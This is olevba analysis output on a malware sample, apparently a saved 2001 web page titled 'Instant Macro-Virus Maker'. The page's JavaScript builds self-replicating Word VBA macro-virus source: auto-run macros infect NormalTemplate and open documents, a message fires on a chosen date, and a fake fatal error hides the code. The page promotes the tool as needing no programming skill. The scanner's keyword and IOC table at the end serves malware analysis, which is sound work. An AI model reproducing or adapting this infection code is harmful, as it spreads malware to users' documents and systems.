olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.IMVM
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSWord.IMVM 
in file: ./Virus.MSWord.IMVM - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0039)http://www.virii.s5.com/Engle/Imvm2.htm -->
<HTML><HEAD><TITLE>Instant Macro-Virus Maker (IMVM)</TITLE>
<META http-equiv=Content-Type content="text/html; charset=windows-1252"><!--  CopyPasteRight (CPR) 2001 by MI_pirat --><!--         http://www.virii.s5.com         -->
<STYLE type=text/css>TEXTAREA {
	FONT-WEIGHT: bold; COLOR: #c0c0c0; BACKGROUND-COLOR: #000000
}
INPUT {
	FONT-WEIGHT: bold; COLOR: #c0c0c0; BACKGROUND-COLOR: #000000
}
SELECT {
	FONT-WEIGHT: bold; COLOR: #c0c0c0; BACKGROUND-COLOR: #000000
}
A:hover {
	COLOR: #fff000; TEXT-DECORATION: underline
}
A:link {
	TEXT-DECORATION: none
}
A:visited {
	TEXT-DECORATION: none
}
</STYLE>

<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
<BODY text=#ffcc00 vLink=#ff99cc link=#808080 bgColor=#000000><!-- '"NorthSky"' --><!-- Auto Banner Insertion Begin -->
<DIV id=aws_6012 align=center>
<SCRIPT><!--
var g=new Date(); g=(window.bRand726 ? window.bRand726 : g.getTime()%1000); window.bRand726=g;
document.writeln('<iframe name=ns_6900 width="726" height="64" bgcolor="white" hspace=0 vspace=0 src=http://www.virii.s5.com/cgi-bin/b/726/64/dXNlcmJhbm5lcg==/is/'+g+'/?ns_6900 scrolling=no marginwidth=0 marginheight=0 frameborder=0></iframe>');
//--></SCRIPT>
<NOSCRIPT><IFRAME name=ns_6900 marginWidth=0 marginHeight=0 
src="Instant Macro-Virus Maker (IMVM)_file/816.html" frameBorder=0 width=726 
scrolling=no height=64 bgcolor="white"></iframe></IFRAME></NOSCRIPT></DIV><!-- Auto Banner Insertion Complete THANK YOU --><!-- JScript by MI_pirat & help form CoffeeCup, probably the best editor in this Word! -->
<SCRIPT language=JavaScript>
function scrie() {
dr="\r\n"
q='"'
j="_"
document.VG.surce.value="'Module Name: "+document.VG.nume.value+dr+"'***Generated with: IMVM by MI_pirat***"+dr+"'Copy the code in a module with the same name "+dr+"'as the virus:"+dr+dr
if (document.VG.Auto.value == 0) document.VG.surce.value=document.VG.surce.value+ "Sub AutoOpen()"
if (document.VG.Auto.value == 1) document.VG.surce.value=document.VG.surce.value+ "Sub AutoClose()"
if (document.VG.Auto.value == 2) document.VG.surce.value=document.VG.surce.value+ "Sub AutoSave()"
document.VG.surce.value=document.VG.surce.value+
"\r\n"+document.VG.q.value+"The "+document.VG.nume.value+" VIRUS"+"\r\n"+document.VG.q.value+"by "+document.VG.autor.value+"\r\n"+
"On Error Resume Next"+dr+"If Application.UserName <> "+q+document.VG.nume.value+q+" Then"+
dr+"Set mytemplate = NormalTemplate"+
dr+"Application.OrganizerCopy Source:= "+j+
dr+"ActiveDocument.FullName, Destination:= "+j+
dr+"mytemplate.FullName, Name:= "+j+
dr+q+document.VG.nume.value+q+" , Object:=wdOrganizerObjectProjectItems"+
dr+"Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly _"+
dr+":=False, AddToRecentFiles:=False, PasswordDocument:="+q+q+", PasswordTemplate _"+
dr+":="+q+q+", Revert:=False, WritePasswordDocument:="+q+q+", WritePasswordTemplate:="+q+q+" _"+
dr+", Format:=wdOpenFormatAuto"+
dr+"ActiveDocument.Save"+
dr+"ActiveDocument.Close"+
dr+"Application.UserName = "+q+document.VG.nume.value+q+
dr+"End If"+dr+"For Each aVar In ActiveDocument.Variables"+
dr+"If aVar.Name = "+q+"Inf"+q+" Then num = aVar.Index"+
dr+"Next aVar"+dr+"If num = 0 Then"+
dr+"ActiveDocument.Variables.Add Name:="+q+"Inf"+q+
dr+"Set mytemplate = ActiveDocument.AttachedTemplate"+
dr+"Application.OrganizerCopy Source:= "+j+
dr+"mytemplate.FullName, Destination:= "+j+
dr+"ActiveDocument.FullName, Name:= "+j+
dr+q+document.VG.nume.value+q+", Object:=wdOrganizerObjectProjectItems"+
dr+"ActiveDocument.Save"+dr+"End If"+
dr+"zi = Day(Date)"+
dr+"If zi = "+document.VG.data.value+" Then MsgBox "+q+document.VG.txt.value+q+
dr+"End Sub"+dr+"Sub ViewVBCode()"+dr+"On Error Resume Next"+
dr+"MsgBox "+q+"WinWord Fatal error !"+q+", vbCritical, "+q+"Error at 453654[ecx]:9045{vxd}"+q+dr+"Application.Quit (False)"+
dr+"End Sub"

}
</SCRIPT>

<H2>
<CENTER><FONT color=#909090>The Instant Macro-Virus Maker (IMVM) 
v1.2</CENTER></H2></FONT><B>This, as far as I know, is the first (and only) 
on-line virus creation tool. <BR>NO DOWNLOAD, NO WASTED TIME, NO PROGRAMING 
SKILL NEEDED!!! <BR>Choose from the options (few, I know, but it's the first 
edition) and then copy/paste the generated code into a Word (97...2000 etc.) 
module named after the virus. Enjoy!!!</B> <IMG height=300 alt="AtOmIc PoWeR" 
src="Instant Macro-Virus Maker (IMVM)_file/atom.jpg" width=300 align=right 
border=0> 
<P>
<FORM name=VG encType=text/plain><BR>Virus name: <BR><INPUT value=Name 
name=nume> <BR>Author's name: <BR><INPUT value="Your name" name=autor> <BR>Used 
macro: <BR><SELECT tabIndex=1 size=1 name=Auto #000000 border-color: solid; 
border-style: disc; list-style-type:> <OPTION value=0 selected>AutoOpen<OPTION 
  value=1>AutoClose<OPTION value=2>AutoSave</OPTION></SELECT> <BR>Text to display: 
<BR><INPUT value="A text to show" name=txt> <BR>The date when the text is shown 
(between 1 and 31): <BR><INPUT value=00 name=data> <INPUT type=hidden value="'" 
name=q> 
<P><INPUT onclick=scrie() type=button value=Generate> 
<P><B>Final source:</B> <BR><TEXTAREA name=surce rows=10 cols=50></TEXTAREA> 
</FORM>
<P><A href="http://www.virii.s5.com/Engle/virii2.htm">Back</A> 
<H3>
<CENTER>by MI_pirat</CENTER></H3></BODY></HTML>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.virii.s5.|URL                                          |
|          |com/Engle/Imvm2.htm |                                             |
|IOC       |http://www.virii.s5.|URL                                          |
|          |com                 |                                             |
|IOC       |http://www.virii.s5.|URL                                          |
|          |com/cgi-bin/b/726/64|                                             |
|          |/dXNlcmJhbm5lcg==/is|                                             |
|          |/'+g+'/?ns_6900     |                                             |
|IOC       |http://www.virii.s5.|URL                                          |
|          |com/Engle/virii2.htm|                                             |
+----------+--------------------+---------------------------------------------+

